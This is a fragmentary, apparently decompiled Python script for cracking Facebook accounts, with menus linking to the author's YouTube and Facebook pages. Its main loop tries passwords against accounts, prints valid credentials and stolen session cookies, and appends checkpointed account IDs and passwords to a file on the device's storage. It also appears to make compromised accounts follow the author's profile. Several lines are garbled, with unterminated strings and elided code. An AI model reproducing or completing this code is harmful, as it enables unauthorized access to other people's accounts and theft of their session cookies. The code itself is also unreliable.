...
def ud():
    ...
    if opt == '1':
        os.system('https://youtube.com/@jubuthenoob22
        FD()
        return None
...
def FD():
    ...
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100085812284418
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
...
def o():
    ...
    if opt == '2':
        ...
        return None
    if opt == '3':
        os.system('xdg-open https://youtube.com/@jubuthenoob22
        return None
    if opt == '4':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100085812284418
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100085812284418
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m[JUBU                                -OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m[JUBU                                -CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/JUBU                                -CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(' %s[JUBU                                ] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
